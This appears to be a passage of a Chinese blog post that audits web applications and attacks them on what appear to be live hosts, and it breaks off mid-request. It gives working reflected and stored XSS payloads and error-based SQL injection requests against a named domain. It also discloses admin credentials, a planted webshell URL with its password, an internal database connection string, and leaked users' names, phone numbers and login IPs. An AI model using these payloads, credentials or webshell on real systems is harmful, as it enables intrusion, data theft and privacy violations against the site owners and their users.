<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/8423b4fcf9ec7274.png"></p>
<p>3）存储 * 3</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.77.154.178:1980/home/appinterface/getindexdata?type=live</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppF7ZYF"><img src="https://s1.ax1x.com/2023/03/02/ppF7ZYF.png" alt="ppF7ZYF.png"></a></p>
<p>4）存储 * 4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.77.154.178:1980/home/appinterface/getsyktlist</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppF7hmq"><img src="https://s1.ax1x.com/2023/03/02/ppF7hmq.png" alt="ppF7hmq.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppF757V"><img src="https://s1.ax1x.com/2023/03/02/ppF757V.png" alt="ppF757V.png"></a></p>
<p>以上的XSS其实我并没有找全，只是找个几个象征性的</p>
<p>5）存储XSS * bypass</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.77.154.178:1980/home/teacher/album/id/6?pagelimit2=12&amp;pagecurr2=1&amp;aid=6</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.imagehub.cc/images/2023/03/02/bd739c504111379b35251a474a7e3a7d.png" alt="bd739c504111379b35251a474a7e3a7d.png"><img src="https://s1.imagehub.cc/images/2023/03/02/45d738d11ce53ec27520cdd536e37f8f.png" alt="45d738d11ce53ec27520cdd536e37f8f.png"><img src="https://s1.imagehub.cc/images/2023/03/02/8a65e1c64fabcc93bc5d587ad6f4bd63.png" alt="8a65e1c64fabcc93bc5d587ad6f4bd63.png"></p>
<p>这里我们输入的post过去的content只是经过了一个html实体编码</p>
<p>绕过参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/lza20001103/article/details/124393055">https://blog.csdn.net/lza20001103/article/details/124393055</a></p>
<p><img src="https://s1.imagehub.cc/images/2023/03/02/272d519b1aae267169b4395865f74b4e.png" alt="272d519b1aae267169b4395865f74b4e.png">虽然过去了，但是并没用执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">付费资源价格参数设置错误，请联系管理员！</span><br></pre></td></tr></table></figure>



<p>6）存储 * 6</p>
<h4 id="反射XSS篇"><a href="#反射XSS篇" class="headerlink" title="反射XSS篇"></a>反射XSS篇</h4><p>还是刚才那个控制器，三个变量直接return存在反射XSS</p>
<p><img src="https://s1.imagehub.cc/images/2023/03/02/8de250ee89a823dcbe6c464cf36f638a.png" alt="8de250ee89a823dcbe6c464cf36f638a.png"></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.77.154.178:1980/home/appinterface/app_res?status=&lt;img src=x onerror=alert(1)&gt;&amp;info=2&amp;data=3</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.imagehub.cc/images/2023/03/02/aba75bdb1a702fa542c3e77fc0a7ccc4.png" alt="aba75bdb1a702fa542c3e77fc0a7ccc4.png"></p>
<p>.</p>
<p>==========================================================================</p>
<h3 id="第二套"><a href="#第二套" class="headerlink" title="第二套"></a>第二套</h3><p>北京沐鱼科技有限公司</p>
<p>官网：<a target="_blank" rel="noopener" href="https://www.techmuyu.com/#">https://www.techmuyu.com/#</a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppDsqxO"><img src="https://s1.ax1x.com/2023/03/25/ppDsqxO.png" alt="ppDsqxO.png"></a></p>
<p>源码：<a target="_blank" rel="noopener" href="http://wechat.dcdx.cn/batman123.tar.gz">http://wechat.dcdx.cn/batman123.tar.gz</a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppDsXse"><img src="https://s1.ax1x.com/2023/03/25/ppDsXse.png" alt="ppDsXse.png"></a></p>
<p>测试账号和密码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">dcdx2019</span><br><span class="line"></span><br><span class="line">weixin01</span><br><span class="line">fm@1722</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppDyKJ0"><img src="https://s1.ax1x.com/2023/03/25/ppDyKJ0.png" alt="ppDyKJ0.png"></a></p>
<p>webshell：<a target="_blank" rel="noopener" href="http://wechatimg.dcdx.cn/img/202301/04/p.php">http://wechatimg.dcdx.cn/img/202301/04/p.php</a></p>
<p>密码：rebeyond</p>
<p>在config下找到数据库连接的账号密码</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppDy7wj"><img src="https://s1.ax1x.com/2023/03/25/ppDy7wj.png" alt="ppDy7wj.png"></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql://dbu_wework:dcdx2019@192.168.50.27:3306/dbwework</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pp6bF8P"><img src="https://s1.ax1x.com/2023/03/28/pp6bF8P.png" alt="pp6bF8P.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pp6bkgf"><img src="https://s1.ax1x.com/2023/03/28/pp6bkgf.png" alt="pp6bkgf.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppDy56S"><img src="https://s1.ax1x.com/2023/03/25/ppDy56S.png" alt="ppDy56S.png"></a></p>
<p>对于小站来说，就是那种多层目录只有2-5个左右的，我就直接看源码了，像那种6-10层的我会先把功能点翻完后再细致看代码</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppD62B4"><img src="https://s1.ax1x.com/2023/03/25/ppD62B4.png" alt="ppD62B4.png"></a></p>
<p>Apps控制器</p>
<p>这里我们在appslist方法下面发现我们传入的seach调用了Code模型下的preg_my方法</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppDgjpt"><img src="https://s1.ax1x.com/2023/03/25/ppDgjpt.png" alt="ppDgjpt.png"></a></p>
<p>在这个方法下，依次遍历取出我们post过去的值然后is_string_regular方法，该方法是用来防止SQL注入的</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppD2ZcV"><img src="https://s1.ax1x.com/2023/03/25/ppD2ZcV.png" alt="ppD2ZcV.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppD2ikj"><img src="https://s1.ax1x.com/2023/03/25/ppD2ikj.png" alt="ppD2ikj.png"></a><a target="_blank" rel="noopener" href="https://imgse.com/i/ppD2khn"><img src="https://s1.ax1x.com/2023/03/25/ppD2khn.png" alt="ppD2khn.png"></a></p>
<p>其他都还好可以想办法绕过，但是对单引号拦截那就无了…，另外发现这个方法还对alert进行了拦截</p>
<p>我们构造请求</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppD2891"><img src="https://s1.ax1x.com/2023/03/25/ppD2891.png" alt="ppD2891.png"></a></p>
<p>这里并没有执行SQL语句直接返回了，存在反射XSS</p>
<h5 id="反射XSS"><a href="#反射XSS" class="headerlink" title="反射XSS"></a>反射XSS</h5><p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppDcN26"><img src="https://s1.ax1x.com/2023/03/25/ppDcN26.png" alt="ppDcN26.png"></a></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Index/Apps/appslist.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>wechat.dcdx.cn</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>28</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=15glkgrrarhv69ruqodvimf0s0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-routeros"><span class="attribute">search</span>=&lt;svg <span class="attribute">onload</span>=alert(1)&gt;</span></span><br></pre></td></tr></table></figure>





<h5 id="反射XSS-2"><a href="#反射XSS-2" class="headerlink" title="反射XSS * 2"></a>反射XSS * 2</h5><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Index/Apps/loadapp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>wechat.dcdx.cn</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://wechat.dcdx.cn/Index/Apps/loadapp</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>47</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://wechat.dcdx.cn</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=15glkgrrarhv69ruqodvimf0s0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;101&quot;, &quot;Chromium&quot;;v=&quot;101&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">search</span>=%<span class="number">3</span>Cimg+src%<span class="number">3</span>Dx+onerror%<span class="number">3</span>Dalert%<span class="number">281</span>%<span class="number">29</span>%<span class="number">3</span>E</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppD27vV"><img src="https://s1.ax1x.com/2023/03/25/ppD27vV.png" alt="ppD27vV.png"></a></p>
<h5 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h5><p>很直接的注入…</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppDRFbD"><img src="https://s1.ax1x.com/2023/03/25/ppDRFbD.png" alt="ppDRFbD.png"></a><a target="_blank" rel="noopener" href="https://imgse.com/i/ppDRAVe"><img src="https://s1.ax1x.com/2023/03/25/ppDRAVe.png" alt="ppDRAVe.png"></a></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Index/Apps/appsdetail</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>wechat.dcdx.cn</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://wechat.dcdx.cn/Index/Apps/appsdetail</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>95</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://wechat.dcdx.cn</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=15glkgrrarhv69ruqodvimf0s0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;101&quot;, &quot;Chromium&quot;;v=&quot;101&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">appid</span>=&#x27;||if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)=&#x27;x&#x27;,<span class="number">1</span>,exp(<span class="number">710</span>))||&#x27;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppDRiDO"><img src="https://s1.ax1x.com/2023/03/25/ppDRiDO.png" alt="ppDRiDO.png"></a></p>
<h5 id="SQL注入-2"><a href="#SQL注入-2" class="headerlink" title="SQL注入 * 2"></a>SQL注入 * 2</h5><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://wechat.dcdx.cn/Index/user/DirDepDataAll?userid=&quot;||if(substr(database(),1,1)=&#x27;d&#x27;,1,exp(710))||&quot;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppD7cJU"><img src="https://s1.ax1x.com/2023/03/25/ppD7cJU.png" alt="ppD7cJU.png"></a><a target="_blank" rel="noopener" href="https://imgse.com/i/ppD7gWF"><img src="https://s1.ax1x.com/2023/03/25/ppD7gWF.png" alt="ppD7gWF.png"></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:1,&quot;result&quot;:&quot;获取企业列表&quot;,&quot;message&quot;:&quot;获取企业列表成功&quot;,&quot;data&quot;:[&#123;&quot;corpid&quot;:&quot;&quot;,&quot;orgname&quot;:&quot;&quot;,&quot;orgtype&quot;:&quot;0&quot;,&quot;orgtypename&quot;:&quot;平台方&quot;,&quot;userinfo&quot;:[&#123;&quot;userid&quot;:&quot;8afacada79071be3d0dbf5416cddf773&quot;,&quot;usercode&quot;:&quot;weixin18&quot;,&quot;username&quot;:&quot;王颢捷&quot;,&quot;nickname&quot;:&quot;王颢捷&quot;,&quot;mobile&quot;:&quot;17600281725&quot;,&quot;email&quot;:&quot;&quot;,&quot;usertype&quot;:&quot;0&quot;,&quot;usertypename&quot;:&quot;超级管理员&quot;,&quot;flag&quot;:&quot;0&quot;,&quot;flagname&quot;:&quot;已启用&quot;,&quot;firsttime&quot;:null,&quot;lasttime&quot;:&quot;2021-09-03 17:36:38&quot;,&quot;loginip&quot;:&quot;119.57.142.61&quot;,&quot;loginnums&quot;:&quot;29&quot;&#125;,&#123;&quot;userid&quot;:&quot;2be2442fd91cd7d4526c423a3e3278ba&quot;,&quot;usercode&quot;:&quot;weixin01&quot;,&quot;username&quot;:&quot;雲中漫步&quot;,&quot;nickname&quot;:&quot;微信运维&quot;,&quot;mobile&quot;:&quot;&quot;,&quot;email&quot;:&quot;&quot;,&quot;usertype&quot;:&quot;0&quot;,&quot;usertypename&quot;:&quot;超级管理员&quot;,&quot;flag&quot;:&quot;0&quot;,&quot;flagname&quot;:&quot;已启用&quot;,&quot;firsttime&quot;:null,&quot;lasttime&quot;:&quot;2023-03-25 19:38:09&quot;,&quot;loginip&quot;:&quot;113.5.8.134&quot;,&quot;loginnums&quot;:&quot;5&quot;&#125;]&#125;]&#125;</span><br></pre></td></tr></table></figure>

<h5 id="SQL注入-3"><a href="#SQL注入-3" class="headerlink" title="SQL注入 * 3"></a>SQL注入 * 3</h5><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Index/user/getStoredProcedureOrgInfo</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>wechat.dcdx.cn</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>96</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=15glkgrrarhv69ruqodvimf0s0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">search</span>=&#x27;||if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)=&#x27;x&#x27;,<span class="number">1</span>,exp(<span class="number">710</span>))||&#x27;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppDH5cQ"><img src="https://s1.ax1x.com/2023/03/25/ppDH5cQ.png" alt="ppDH5cQ.png"></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bumenquanxian[0][name]=dep&amp;bumenquanxian[0][value]=2&amp;bumenquanxian[1][name]=dep&amp;bumenquanxian[1][value]=4&amp;bumenquanxian[2][name]=dep&amp;bumenquanxian[2][value]=5&amp;bumenquanxian[3][name]=dep&amp;bumenquanxian[3][value]=6&amp;bumenquanxian[4][name]=dep&amp;bumenquanxian[4][value]=7&amp;bumenquanxian[5][name]=dep&amp;bumenquanxian[5][value]=8&amp;bumenquanxian[6][name]=dep&amp;bumenquanxian[6][value]=9&amp;bumenquanxian[7][name]=dep&amp;bumenquanxian[7][value]=10&amp;bumenquanxian[8][name]=dep&amp;bumenquanxian[8][value]=11&amp;bumenquanxian[9][name]=dep&amp;bumenquanxian[9][value]=12&amp;bumenquanxian[10][name]=dep&amp;bumenquanxian[10][value]=13&amp;bumenquanxian[11][name]=dep&amp;bumenquanxian[11][value]=14&amp;bumenquanxian[12][name]=dep&amp;bumenquanxian[12][value]=15&amp;bumenquanxian[13][name]=dep&amp;bumenquanxian[13][value]=16&amp;bumenquanxian[14][name]=dep&amp;bumenquanxian[14][value]=17&amp;bumenquanxian[15][name]=dep&amp;bumenquanxian[15][value]=18&amp;bumenquanxian[16][name]=dep&amp;bumenquanxian[16][value]=19&amp;bumenquanxian[17][name]=dep&amp;bumenquanxian[17][value]=3&amp;bumenquanxian[18][name]=dep&amp;bumenquanxian[18][value]=20&amp;bumenquanxian[19][name]=dep&amp;bumenquanxian[19][value]=24&amp;bumenquanxian[20][name]=dep&amp;bumenquanxian[20][value]=25&amp;bumenquanxian[21][name]=dep&amp;bumenquanxian[21][value]=26&amp;bumenquanxian[22][name]=dep&amp;bumenquanxian[22][value]=27&amp;bumenquanxian[23][name]=dep&amp;bumenquanxian[23][value]=28&amp;bumenquanxian[24][name]=dep&amp;bumenquanxian[24][value]=29&amp;bumenquanxian[25][name]=dep&amp;bumenquanxian[25][value]=30&amp;bumenquanxian[26][name]=dep&amp;bumenquanxian[26][value]=31&amp;bumenquanxian[27][name]=dep&amp;bumenquanxian[27][value]=32&amp;bumenquanxian[28][name]=dep&amp;bumenquanxian[28][value]=33&amp;bumenquanxian[29][name]=dep&amp;bumenquanxian[29][value]=34&amp;bumenquanxian[30][name]=dep&amp;bumenquanxian[30][value]=35&amp;bumenquanxian[31][name]=dep&amp;bumenquanxian[31][value]=36&amp;bumenquanxian[32][name]=dep&amp;bumenquanxian[32][value]=37&amp;bumenquanxian[33][name]=dep&amp;bumenquanxian[33][value]=38&amp;bumenquanxian[34][name]=dep&amp;bumenquanxian[34][value]=39&amp;bumenquanxian[35][name]=dep&amp;bumenquanxian[35][value]=40&amp;bumenquanxian[36][name]=dep&amp;bumenquanxian[36][value]=41&amp;bumenquanxian[37][name]=dep&amp;bumenquanxian[37][value]=42&amp;bumenquanxian[38][name]=dep&amp;bumenquanxian[38][value]=43&amp;bumenquanxian[39][name]=dep&amp;bumenquanxian[39][value]=44&amp;bumenquanxian[40][name]=dep&amp;bumenquanxian[40][value]=45&amp;bumenquanxian[41][name]=dep&amp;bumenquanxian[41][value]=21&amp;bumenquanxian[42][name]=dep&amp;bumenquanxian[42][value]=22&amp;bumenquanxian[43][name]=dep&amp;bumenquanxian[43][value]=23&amp;approleall[0][name]=checkroleapp3501&amp;approleall[0][value]=3501&amp;approleall[1][name]=checkroleapp3401&amp;approleall[1][value]=3401&amp;approleall[2][name]=checkroleapp3301&amp;approleall[2][value]=3301&amp;approleall[3][name]=checkroleapp1003&amp;approleall[3][value]=1003&amp;approleall[4][name]=checkroleapp1002&amp;approleall[4][value]=1002&amp;approleall[5][name]=checkroleapp1001&amp;approleall[5][value]=1001&amp;jiaosequanxian[0][name]=checkrole188173e21f06750865aa65ee6a5c9b7f&amp;jiaosequanxian[0][value]=188173e21f06750865aa65ee6a5c9b7f&amp;jiaosequanxian[1][name]=checkrolec1317fe6164b406129f5a91e22716352&amp;jiaosequanxian[1][value]=c1317fe6164b406129f5a91e22716352&amp;jiaosequanxian[2][name]=checkroled401e0e50f7b397d6765b14216c991ab&amp;jiaosequanxian[2][value]=d401e0e50f7b397d6765b14216c991ab&amp;zhanghaoxinxi[0][name]=nickname&amp;zhanghaoxinxi[0][value]=batman123&amp;zhanghaoxinxi[1][name]=username&amp;zhanghaoxinxi[1][value]=batman123&amp;zhanghaoxinxi[2][name]=userid&amp;zhanghaoxinxi[2][value]=&amp;zhanghaoxinxi[3][name]=nones&amp;zhanghaoxinxi[3][value]=&amp;zhanghaoxinxi[4][name]=editpassword&amp;zhanghaoxinxi[4][value]=&amp;zhanghaoxinxi[5][name]=companyname&amp;zhanghaoxinxi[5][value]=batman123&amp;zhanghaoxinxi[6][name]=invitationcorpid&amp;zhanghaoxinxi[6][value]=&amp;zhanghaoxinxi[7][name]=invitationCode&amp;zhanghaoxinxi[7][value]=&amp;zhanghaoxinxi[8][name]=realname&amp;zhanghaoxinxi[8][value]=batman123&amp;zhanghaoxinxi[9][name]=one&quot;&amp;zhanghaoxinxi[9][value]=18243330728&amp;zhanghaoxinxi[10][name]=email&amp;zhanghaoxinxi[10][value]=batmanfuture111111@163.com&amp;phone=123&#x27;&quot;</span><br></pre></td></tr></table></figure>



<h5 id="查看型号越权-身份证"><a href="#查看型号越权-身份证" class="headerlink" title="查看型号越权-身份证"></a>查看型号越权-身份证</h5><p>获取hash</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://wechat.dcdx.cn/index/user/editUserInfoApi?userid=2be2442fd91cd7d4526c423a3e3278ba</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppDqFqs"><img src="https://s1.ax1x.com/2023/03/25/ppDqFqs.png" alt="ppDqFqs.png"></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://wechat.dcdx.cn/index/user/editUserInfoApi?userid=2d28d2ef111611e99aba0cda411d7a3f</span><br></pre></td></tr></table></figure>

<p>获取userid即可</p>
<p>不存在SQL注入（预处理-参数绑定）</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppDqeiV"><img src="https://s1.ax1x.com/2023/03/25/ppDqeiV.png" alt="ppDqeiV.png"></a></p>
<p><img src="https://s1.imagehub.cc/images/2023/03/25/3a522ec6f032601115f112f518939fc2.png" alt="3a522ec6f032601115f112f518939fc2.png"></p>
<h5 id="反射XSS-3"><a href="#反射XSS-3" class="headerlink" title="反射XSS * 3"></a>反射XSS * 3</h5><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Index/Apps/saveAppsinfo</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>wechat.dcdx.cn</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://wechat.dcdx.cn/Index/Apps/appsdetail/appid/1002</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>196</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://wechat.dcdx.cn</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: 